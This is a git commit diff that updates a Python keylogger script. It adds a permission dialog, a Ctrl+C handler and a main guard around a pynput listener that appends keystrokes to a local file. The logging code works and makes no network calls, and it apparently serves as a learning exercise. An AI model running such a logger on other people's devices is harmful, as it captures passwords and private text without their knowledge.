3d76242ca9b6cfbd8bacb8060c705f4817922d97
Ghost <75405213+AbhilashChutia@users.noreply.github.com>
2024-10-14 19:47:06 +0530

    Add files via upload

--- Keylogger.py
+++ Keylogger.py
@@ -1,21 +1,55 @@
 from pynput.keyboard import Listener
+import tkinter as tk
+from tkinter import messagebox
+import signal
+import sys
 
 # Path to save the log file
 log_file = "keylog.txt"
 
 # Function to log keystrokes
 def log_key(key):
-    key = str(key).replace("'", "")  # Clean up the key format
+    key = str(key).replace("'", "")
     if key == 'Key.space':
-        key = ' '  # Replace 'space' with an actual space
+        key = ' '
     elif key == 'Key.enter':
-        key = '\n'  # Replace 'enter' with a new line
+        key = '\n'
     elif key.startswith('Key'):
-        key = ''  # Ignore special keys (like shift, ctrl, etc.)
-    
+        key = ''
+
     with open(log_file, "a") as f:
         f.write(key)
 
-# Setting up the key listener
-with Listener(on_press=log_key) as listener:
-    listener.join()
+# Function to get user permission through UI
+def get_user_permission():
+    root = tk.Tk()
+    root.withdraw()
+    
+    response = messagebox.askyesno("Permission Request", "This script will log your keystrokes. Do you give permission to proceed?")
+    
+    if response:
+        messagebox.showinfo("Permission Granted", "Starting keylogger...")
+        return True
+    else:
+        messagebox.showinfo("Permission Denied", "Exiting script.")
+        root.quit()
+        return False
+
+# Signal handler for Ctrl+C
+def signal_handler(sig, frame):
+    print("\nScript terminated by user (Ctrl+C). Exiting...")
+    sys.exit(0)
+
+if __name__ == "__main__":
+    # Register the signal handler for Ctrl+C
+    signal.signal(signal.SIGINT, signal_handler)
+
+    # Check for permission before starting
+    if get_user_permission():
+        try:
+            # Start key logging
+            with Listener(on_press=log_key) as listener:
+                listener.join()
+        except KeyboardInterrupt:
+            print("\nScript terminated by user (Ctrl+C). Exiting...")
+            sys.exit(0)
